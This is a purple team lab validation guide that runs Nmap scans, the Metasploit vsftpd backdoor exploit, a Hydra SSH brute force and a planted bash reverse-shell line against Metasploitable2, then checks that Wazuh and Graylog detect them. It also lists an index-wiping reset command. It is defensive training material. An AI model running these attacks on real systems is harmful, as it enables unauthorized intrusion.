# Validation and Testing

Verify your purple team lab is working correctly by running attack scenarios and confirming detections.

**Time Required:** 1-2 hours  
**Difficulty:** Intermediate  
**Prerequisites:** All infrastructure deployed

## Overview

We'll validate the lab by:
1. Testing network connectivity
2. Running reconnaissance scans
3. Exploiting vulnerabilities
4. Verifying detections in SIEM
5. Checking log flow to Graylog

## Part 1: Basic Connectivity Tests

### Test 1: Network Reachability

**From Kali Linux:**
```bash
# SSH into Kali
ssh kali@<internal-ip>

# Test connectivity to all lab systems
ping -c 4 <internal-ip>   # Metasploitable
ping -c 4 <internal-ip>    # Unraid
ping -c 4 <internal-ip>    # Gateway
ping -c 4 8.8.8.8          # Internet

# All should succeed
```

**Expected results:**
```
✅ Metasploitable: 0% packet loss
✅ Unraid: 0% packet loss
✅ Gateway: 0% packet loss
✅ Internet: 0% packet loss
```

### Test 2: Service Accessibility
```bash
# From Kali

# Check Wazuh manager is listening
nc -zv <internal-ip> 1514
# Should show: Connection succeeded

# Check web interfaces (from your workstation)
curl -k https://<internal-ip>:443  # Wazuh dashboard
curl http://<internal-ip>:9000     # Graylog (if deployed)
```

### Test 3: Agent Connectivity

**Verify agents are active:**

1. **Open Wazuh Dashboard:** https://unraid-ip:443
2. **Navigate to:** Agents
3. **Verify both agents show:**
   - Status: Active (green)
   - Last Keep Alive: < 1 minute ago
   - OS: Correct (Ubuntu for Metasploitable, Debian for Kali)

**From command line:**
```bash
# SSH into Unraid
ssh root@unraid-ip

# Check agent status
docker exec wazuh-manager /var/ossec/bin/agent_control -l

# Expected output:
# Wazuh agent_control. List of available agents:
#    ID: 001, Name: metasploitable2, IP: <internal-ip>, Active
#    ID: 002, Name: kali-lab, IP: <internal-ip>, Active
```

## Part 2: Reconnaissance Detection

### Scenario 1: Port Scanning (Nmap)

**From Kali, scan Metasploitable:**
```bash
# Run a basic scan
nmap -sV <internal-ip>

# Run a more aggressive scan
nmap -A -T4 <internal-ip> -oN scan-results.txt

# Wait 2-3 minutes after scan completes
```

**Verify Detection in Wazuh:**

1. **Wazuh Dashboard** → **Security Events**
2. **Filter:** Search for "nmap" or rule.id: 100001
3. **You should see:**
   - Alert: "Nmap scan detected"
   - Source IP: <internal-ip> (Kali)
   - Destination: <internal-ip> (Metasploitable)
   - Severity: Medium or High

**Expected Wazuh Alert:**
```json
{
  "rule": {
    "id": "100001",
    "description": "Nmap scan detected from <internal-ip>"
  },
  "agent": {
    "name": "metasploitable2",
    "ip": "<internal-ip>"
  },
  "srcip": "<internal-ip>"
}
```

**Verify in Graylog (if deployed):**

1. **Graylog** → **Search**
2. Search: `source:<internal-ip> AND nmap`
3. Should see corresponding syslog entries

**✅ Test passes if:** Wazuh shows alert within 5 minutes of scan

### Scenario 2: Service Enumeration
```bash
# From Kali
nmap -sV -p21,22,23,80,445 <internal-ip>

# Check specific services
telnet <internal-ip> 21   # FTP
telnet <internal-ip> 23   # Telnet
```

**Verify:** Connection attempts logged in Wazuh under Security Events

## Part 3: Exploitation Detection

### Scenario 3: vsftpd Backdoor Exploit

This is one of Metasploitable's most famous vulnerabilities.

**From Kali:**
```bash
# Start Metasploit
msfconsole -q

# In msfconsole:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <internal-ip>
set LHOST <internal-ip>
show options
exploit
```

**Expected outcome:**
```
[*] <internal-ip>:21 - Banner: 220 (vsFTPd 2.3.4)
[*] <internal-ip>:21 - USER: 331 Please specify the password.
[+] <internal-ip>:21 - Backdoor service has been spawned, handling...
[+] <internal-ip>:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

**In the shell:**
```bash
whoami
# Should return: root

id
# Should show: uid=0(root) gid=0(root) groups=0(root)

pwd
# Shows current directory

# Exit the shell
exit
```

**Verify Detection in Wazuh:**

1. **Security Events** → Filter by severity: High
2. Look for:
   - Rule 100002: "Metasploit activity detected"
   - Rule 100005: "Reverse shell detected"
   - Connection to port 6200 (backdoor port)

3. **Check File Integrity Monitoring:**
   - Navigate to **Integrity Monitoring**
   - Look for any file changes on Metasploitable

**Verify in Logs:**
```bash
# On Metasploitable
ssh msfadmin@<internal-ip>
sudo tail -100 /var/log/auth.log

# Should show the backdoor connection
```

**✅ Test passes if:** 
- Exploit succeeds (you get root shell)
- Wazuh detects the exploit within 5 minutes
- Alert shows correct source IP (Kali)

### Scenario 4: SSH Brute Force

**From Kali:**
```bash
# Create a small password list
cat > passwords.txt << EOF
password
admin
root
test
metasploit
msfadmin
EOF

# Run Hydra brute force
hydra -l msfadmin -P passwords.txt ssh://<internal-ip> -t 4

# This will try multiple passwords
# msfadmin password will eventually succeed
```

**Verify Detection in Wazuh:**

1. **Security Events** → Search: "brute force" or rule.id: 100003
2. Should see:
   - Multiple "Authentication failed" alerts
   - Final alert: "SSH brute force attempt from <internal-ip>"
   - Frequency: 5+ attempts in 120 seconds

**Expected Alert:**
```
Rule: 100003 - SSH brute force attempt
Source IP: <internal-ip>
Agent: metasploitable2
Failed attempts: 5+
Time window: 120 seconds
```

**✅ Test passes if:** Brute force alert appears after 5 failed attempts

## Part 4: Post-Exploitation Detection

### Scenario 5: Privilege Escalation Attempt

**From existing SSH session on Metasploitable:**
```bash
# SSH into Metasploitable
ssh msfadmin@<internal-ip>

# Try privilege escalation (will fail, but should be detected)
sudo su -
# Enter incorrect password

# Try multiple times
sudo -i
sudo su
sudo whoami

# Check sudo logs
sudo cat /var/log/auth.log | grep sudo
```

**Verify Detection in Wazuh:**

1. **Security Events** → Search: "privilege escalation" or "sudo"
2. Look for rule 100004: "Privilege escalation attempt"
3. Should show failed sudo attempts

### Scenario 6: Suspicious File Creation

**Create and detect suspicious files:**
```bash
# On Metasploitable
cd /tmp

# Create a file with suspicious content
echo '#!/bin/bash' > suspicious.sh
echo '/bin/bash -i >& /dev/tcp/<internal-subnet>44 0>&1' >> suspicious.sh
chmod +x suspicious.sh

# Wait 1-2 minutes for FIM to detect
```

**Verify in Wazuh:**

1. **Integrity Monitoring** → Filter: /tmp
2. Should see:
   - File added: suspicious.sh
   - Permissions changed event
   - Alert level: Medium

**Expected FIM Alert:**
```
File: /tmp/suspicious.sh
Event: added
Mode: scheduled
Changed attributes: size, permissions, md5, sha1
```

## Part 5: Log Flow Verification

### Verify Wazuh Log Collection

**Check log statistics:**

1. **Wazuh Dashboard** → **Overview**
2. **Check:**
   - Events per agent (should be > 0)
   - Top 5 agents by alerts
   - Alert level distribution

**Expected metrics after tests:**
- Total events: 100+
- Total alerts: 10+
- Agents reporting: 2

**View real-time events:**
```bash
# SSH into Unraid
ssh root@unraid-ip

# Watch alerts in real-time
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.log

# Or JSON format
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json
```

### Verify Graylog Log Collection

**If Graylog deployed:**

1. **Graylog** → **Search**
2. **Time range:** Last 1 hour
3. **Search:** `source:<internal-ip> OR source:<internal-ip>`

**Expected results:**
- Message count: 50+
- Sources showing: metasploitable2, kali-lab
- Various log levels: info, warning, error

**Test specific log types:**
```bash
# From Kali
logger -t TEST "This is a test message from Kali"

# From Metasploitable
logger -t TEST "This is a test message from Metasploitable"

# Check in Graylog within 30 seconds
# Search: TEST
# Should see both messages
```

### Test Syslog Forwarding

**Generate test logs:**
```bash
# On both Kali and Metasploitable
for i in {1..10}; do
  logger -p local0.info "Test log message $i from $(hostname)"
  sleep 1
done
```

**Verify in Graylog:**
- Navigate to **Search**
- Filter: `message:*Test log message*`
- Should see 20 messages (10 from each system)

## Part 6: Detection Rule Effectiveness

### Review Custom Rules

**In Wazuh Dashboard:**

1. **Management** → **Rules**
2. **Custom rules** → local_rules.xml
3. **Verify all rules are active:**
   - 100001: Nmap detection ✅
   - 100002: Metasploit detection ✅
   - 100003: SSH brute force ✅
   - 100004: Privilege escalation ✅
   - 100005: Reverse shell ✅

### Check Rule Performance

**Query for each rule:**
```bash
# SSH into Unraid
docker exec wazuh-manager grep "rule.*100001" /var/ossec/logs/alerts/alerts.json

# Count hits for each custom rule
docker exec wazuh-manager bash -c "grep -c 'rule.*10000[1-5]' /var/ossec/logs/alerts/alerts.json"
```

**Expected results after all tests:**
- Rule 100001 (nmap): 2+ hits
- Rule 100002 (metasploit): 1+ hits
- Rule 100003 (brute force): 1+ hits
- Rule 100004 (privilege escalation): 3+ hits
- Rule 100005 (reverse shell): 1+ hits

### Test Detection Accuracy

**Calculate metrics:**
```bash
# Total alerts generated
docker exec wazuh-manager wc -l /var/ossec/logs/alerts/alerts.json

# Custom rule alerts
docker exec wazuh-manager grep -c "rule.*10000" /var/ossec/logs/alerts/alerts.json

# Calculate detection rate
# (Custom rule alerts / Total known attacks) * 100
```

## Part 7: System Health Checks

### Check Container Health
```bash
# On Unraid
docker ps

# Verify all containers show "Up" status:
# wazuh-manager
# wazuh-indexer
# wazuh-dashboard
# graylog (if deployed)
# graylog-mongodb (if deployed)

# Check resource usage
docker stats --no-stream
```

**Expected resource usage:**
```
Container          CPU %    MEM Usage / Limit     MEM %
wazuh-manager      5-15%    500MB-1GB / 16GB      3-6%
wazuh-indexer      10-25%   1-2GB / 16GB          6-12%
wazuh-dashboard    2-8%     200-500MB / 16GB      1-3%
graylog            5-15%    1-2GB / 16GB          6-12%
mongodb            2-5%     200-500MB / 16GB      1-3%
```

### Check Disk Usage
```bash
# Check Docker volumes
docker system df -v

# Check Unraid storage
df -h | grep /mnt/user

# Verify log directories aren't filling up
du -sh /mnt/user/appdata/purple-lab/*/data

# Check individual container sizes
docker exec wazuh-manager du -sh /var/ossec/logs
docker exec wazuh-indexer du -sh /var/lib/wazuh-indexer
```

**Warning signs:**
- Logs consuming > 10GB
- OpenSearch data > 20GB
- Less than 10GB free space remaining

### Check for Errors
```bash
# Check container logs for errors
docker logs wazuh-manager 2>&1 | grep -i error | tail -20
docker logs wazuh-indexer 2>&1 | grep -i error | tail -20
docker logs wazuh-dashboard 2>&1 | grep -i error | tail -20

# Check Wazuh internal logs
docker exec wazuh-manager tail -100 /var/ossec/logs/ossec.log | grep ERROR

# Check agent connection errors
docker exec wazuh-manager grep "Agent.*disconnected" /var/ossec/logs/ossec.log
```

**Acceptable errors:**
- SSL certificate warnings (self-signed certs)
- Occasional agent reconnection messages
- Temporary network timeouts

**Unacceptable errors:**
- Repeated "Out of memory" errors
- Continuous agent disconnections
- Database connection failures
- Permission denied errors

## Validation Checklist

**Network Tests:**
- [ ] All systems can ping each other
- [ ] Agents connect to Wazuh manager (port 1514)
- [ ] Web interfaces accessible (443, 9000)
- [ ] No connectivity to production network (security test)

**Detection Tests:**
- [ ] Nmap scans detected (Rule 100001)
- [ ] Metasploit exploit detected (Rule 100002)
- [ ] SSH brute force detected (Rule 100003)
- [ ] Privilege escalation attempts logged (Rule 100004)
- [ ] Reverse shell patterns detected (Rule 100005)
- [ ] File Integrity Monitoring working

**System Health:**
- [ ] All containers running and healthy
- [ ] CPU usage acceptable (< 50% average)
- [ ] RAM usage within limits (< 80%)
- [ ] Disk space sufficient (> 20GB free)
- [ ] No critical errors in logs
- [ ] Agent status: Active for both systems

**Log Flow:**
- [ ] Events appearing in Wazuh dashboard
- [ ] Logs appearing in Graylog (if deployed)
- [ ] File integrity monitoring working
- [ ] Syslog forwarding operational
- [ ] Alert notifications functioning

**Documentation:**
- [ ] Screenshot Wazuh dashboard
- [ ] Screenshot successful exploit
- [ ] Screenshot detection alerts
- [ ] Document any issues encountered
- [ ] Note baseline performance metrics

## Troubleshooting Common Issues

### Issue: No Detections Appearing

**Diagnose the problem:**
```bash
# Check if agents are actually connected
docker exec wazuh-manager /var/ossec/bin/agent_control -l

# If agent shows "Disconnected":
# On the agent system (Kali or Metasploitable):
sudo systemctl status wazuh-agent

# Check agent logs
sudo tail -f /var/ossec/logs/ossec.log

# Verify manager IP is correct
sudo cat /var/ossec/etc/ossec.conf | grep address
```

**Common fixes:**
```bash
# Restart the agent
sudo systemctl restart wazuh-agent

# If still not connecting, re-register
# On Unraid:
docker exec wazuh-manager /var/ossec/bin/manage_agents

# Follow prompts to add agent manually
```

**Test rule matching:**
```bash
# Use ossec-logtest to test rules
docker exec -it wazuh-manager /var/ossec/bin/ossec-logtest

# Paste a sample log entry
# Example: "nmap scan detected"
# Check if rule 100001 matches
```

### Issue: False Positives

**Identify the problematic rule:**

1. **Wazuh Dashboard** → **Security Events**
2. Sort by frequency
3. Look for repeating alerts that aren't real threats

**Tune rule sensitivity:**
```bash
# Edit custom rules
docker exec -it wazuh-manager nano /var/ossec/etc/rules/local_rules.xml

# Increase frequency threshold
# Before:
<rule id="100003" level="10" frequency="5" timeframe="120">

# After (less sensitive):
<rule id="100003" level="10" frequency="10" timeframe="300">

# Or increase alert level (only alert on higher severity)
# level="10" → level="12"

# Save and restart
docker restart wazuh-manager
```

### Issue: High Resource Usage

**Identify the bottleneck:**
```bash
# Real-time monitoring
docker stats

# Check which container is using most resources
htop  # or top
```

**Reduce OpenSearch memory:**
```bash
# Edit docker-compose or .env
nano /mnt/user/appdata/purple-lab/wazuh-docker/single-node/.env

# Change:
OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g
# To:
OPENSEARCH_JAVA_OPTS=-Xms512m -Xmx512m

# Restart
cd /mnt/user/appdata/purple-lab/wazuh-docker/single-node
docker-compose restart wazuh-indexer
```

**Reduce logging verbosity:**
```bash
# Edit Wazuh config
docker exec -it wazuh-manager nano /var/ossec/etc/ossec.conf

# Change log alert level (only log more severe alerts):
<ossec_config>
  <alerts>
    <log_alert_level>3</log_alert_level>
  </alerts>
</ossec_config>

# Higher number = fewer alerts
# Change 3 → 5 or 7

# Restart
docker restart wazuh-manager
```

**Reduce log retention:**
```bash
# In Wazuh dashboard
# Management → Index Management → Policies
# Edit retention policy
# Change from 30 days → 7 days
```

### Issue: Agents Showing Disconnected

**Check network connectivity:**
```bash
# From agent (Kali or Metasploitable)
telnet <internal-ip> 1514

# Should connect successfully
# Ctrl+] then type "quit" to exit

# If connection fails:
# Check firewall on Unraid
iptables -L -n | grep 1514

# Check if manager is listening
netstat -tulpn | grep 1514
```

**Verify agent configuration:**
```bash
# On agent
sudo cat /var/ossec/etc/ossec.conf | grep -A 5 "<client>"

# Should show:
# <server>
#   <address><internal-ip></address>
#   <port>1514</port>
#   <protocol>tcp</protocol>
# </server>
```

**Re-register agent if needed:**
```bash
# On manager (Unraid)
docker exec -it wazuh-manager /var/ossec/bin/manage_agents

# Choose option 'r' to remove old agent
# Choose option 'a' to add new agent
# Provide: agent name, IP address
# Copy the key shown

# On agent
sudo /var/ossec/bin/manage_agents
# Choose 'i' to import key
# Paste the key
# Restart: sudo systemctl restart wazuh-agent
```

### Issue: Dashboard Not Loading

**Check dashboard container:**
```bash
# Verify container is running
docker ps | grep wazuh-dashboard

# Check logs
docker logs wazuh-dashboard | tail -50

# Look for errors about:
# - Indexer connection failures
# - Certificate problems
# - Memory issues
```

**Common fixes:**
```bash
# Restart dashboard
docker restart wazuh-dashboard

# If that doesn't work, restart entire stack
cd /mnt/user/appdata/purple-lab/wazuh-docker/single-node
docker-compose restart

# Clear browser cache and try again
# Try incognito/private browsing mode
```

### Issue: Graylog Not Receiving Logs

**Check Graylog input:**

1. **Graylog** → **System** → **Inputs**
2. Verify Syslog UDP input is **running**
3. Check message count (should be > 0)

**Test syslog forwarding:**
```bash
# From Kali or Metasploitable
logger -p local0.info "Graylog test message"

# Check in Graylog search within 30 seconds
# If not appearing:

# Verify rsyslog is forwarding
sudo cat /etc/rsyslog.conf | grep <internal-ip>

# Should show:
# *.* @<internal-ip>:1514

# Restart rsyslog
sudo systemctl restart rsyslog

# Test with tcpdump on Unraid
tcpdump -i br0.100 port 1514
# Should see packets when you run logger command
```

## Performance Baseline

After validation, document baseline metrics for future comparison:

**System Resources (Idle State):**
```
CPU Usage: ____% (all containers combined)
RAM Usage: ____GB / ____GB total
Disk Used: ____GB
Network Traffic: ____MB/s

Individual Containers:
- wazuh-manager: CPU ___%, RAM ___MB
- wazuh-indexer: CPU ___%, RAM ___GB
- wazuh-dashboard: CPU ___%, RAM ___MB
- graylog: CPU ___%, RAM ___GB
```

**Detection Performance:**
```
Time to detect nmap: ____ seconds
Time to detect exploit: ____ seconds
Time to detect brute force: ____ seconds
Average alert processing time: ____ seconds

Events per minute: ____
Alerts per hour: ____
```

**Detection Accuracy:**
```
Total attacks simulated: ____
Attacks detected: ____
Detection rate: ____%
False positives: ____
False positive rate: ____%
```

## Success Criteria

Your lab passes validation if:

✅ **All network tests pass** (100% connectivity)  
✅ **Both agents show Active** in dashboard  
✅ **At least 4 out of 5 custom rules** triggered during tests  
✅ **Exploits successfully executed** and detected  
✅ **Logs flowing** to both Wazuh and Graylog  
✅ **No critical errors** in container logs  
✅ **Resource usage** within acceptable limits  
✅ **Dashboard accessible** and responsive  

## Next Steps

Congratulations! Your purple team lab is fully operational. 🎉

**Immediate actions:**

1. **Document your results:**
   - Take screenshots of successful detections
   - Note any issues and how you resolved them
   - Record baseline performance metrics

2. **Update your GitHub repo:**
   - Add screenshots to `images/screenshots/`
   - Document any configuration changes
   - Update CHANGELOG.md

3. **Create your first blog post:**
   - Title: "Building a Purple Team Lab: From Zero to Detection"
   - Include architecture diagram
   - Walk through one complete attack scenario
   - Share lessons learned

**Future enhancements:**

1. **Add more vulnerable targets:**
   - DVWA (Damn Vulnerable Web Application)
   - WebGoat
   - HackTheBox VMs

2. **Develop additional detection rules:**
   - SQL injection attempts
   - Web shell uploads
   - Lateral movement patterns
   - Data exfiltration attempts

3. **Automate attack scenarios:**
   - Create Metasploit resource files (.rc)
   - Build Python scripts for common attacks
   - Document each scenario thoroughly

4. **Improve detection coverage:**
   - Map detections to MITRE ATT&CK framework
   - Identify coverage gaps
   - Create rules for missing techniques

5. **Practice incident response:**
   - Create playbooks for each alert type
   - Practice containment procedures
   - Document lessons learned

6. **Share your knowledge:**
   - Write blog posts about specific scenarios
   - Create video walkthroughs
   - Contribute to security community

## Creating Your First Attack Scenario Documentation

**Template for docs/attack-scenarios.md:**
```markdown
# Attack Scenarios

Documented attack simulations and detection results from the purple team lab.

## Scenario 1: FTP Backdoor Exploitation

**Date:** 2024-12-08  
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)  
**Attacker:** Kali (<internal-ip>)  
**Target:** Metasploitable2 (<internal-ip>)  
**Vulnerability:** vsftpd 2.3.4 Backdoor (CVE-2011-2523)  

### Objective
Gain root access to target system by exploiting known FTP backdoor.

### Attack Steps
1. **Reconnaissance:** `nmap -sV -p21 <internal-ip>`
2. **Exploitation:** 
```
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS <internal-ip>
   exploit
```
3. **Post-exploitation:** Verify root access with `whoami`, `id`

### Detection Results
- **Rule triggered:** 100002 (Metasploit activity detected)
- **Detection time:** 45 seconds after exploit
- **Alert severity:** High
- **Alert details:** Backdoor connection on port 6200
- **False positives:** 0

### Lessons Learned
- ✅ Custom detection rule effective for this exploit
- ⚠️ FIM did not catch all file changes - needs tuning
- ⚠️ No specific rule for port 6200 connections
- ✅ Wazuh alert included correct source/destination IPs

### Improvements Needed
- [ ] Add dedicated rule for port 6200 connections
- [ ] Enhance FIM monitoring for /tmp directory
- [ ] Create automated response playbook
- [ ] Add correlation rule for multiple indicators

### Screenshots
- [Successful exploit](../images/screenshots/vsftpd-exploit.png)
- [Wazuh alert](../images/screenshots/vsftpd-alert.png)
```

## Quick Reference Commands

**Access Points:**
```
Wazuh Dashboard: https://<internal-ip>:443
Graylog: http://<internal-ip>:9000
Kali SSH: ssh kali@<internal-ip>
Metasploitable SSH: ssh msfadmin@<internal-ip>
```

**Container Management:**
```bash
# Check all containers
docker ps

# View logs
docker logs wazuh-manager
docker logs -f wazuh-manager  # follow mode

# Restart container
docker restart wazuh-manager

# Restart entire stack
cd /mnt/user/appdata/purple-lab/wazuh-docker/single-node
docker-compose restart
```

**Agent Management:**
```bash
# Check agent status
docker exec wazuh-manager /var/ossec/bin/agent_control -l

# View agent details
docker exec wazuh-manager /var/ossec/bin/agent_control -i 001

# Manage agents interactively
docker exec -it wazuh-manager /var/ossec/bin/manage_agents
```

**Monitoring:**
```bash
# Real-time alerts
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.log

# JSON alerts
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json

# Check for specific rule
docker exec wazuh-manager grep "rule.*100001" /var/ossec/logs/alerts/alerts.json

# System resources
docker stats

# Disk usage
docker system df
du -sh /mnt/user/appdata/purple-lab/*/data
```

**Testing:**
```bash
# Port scan
nmap -sV <internal-ip>

# Exploit vsftpd
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <internal-ip>; exploit"

# Brute force SSH
hydra -l msfadmin -P passwords.txt ssh://<internal-ip>

# Test syslog
logger -t TEST "This is a test message"

# Test rule matching
docker exec -it wazuh-manager /var/ossec/bin/ossec-logtest
```

**Emergency Procedures:**
```bash
# Stop everything (if system overloaded)
cd /mnt/user/appdata/purple-lab/wazuh-docker/single-node
docker-compose down

# Start with minimal resources
# Edit .env file to reduce memory
# Then: docker-compose up -d

# Clear old logs (if disk full)
docker exec wazuh-manager find /var/ossec/logs -type f -mtime +7 -delete

# Reset OpenSearch indices (nuclear option)
docker exec wazuh-indexer curl -X DELETE "localhost:9200/_all"
```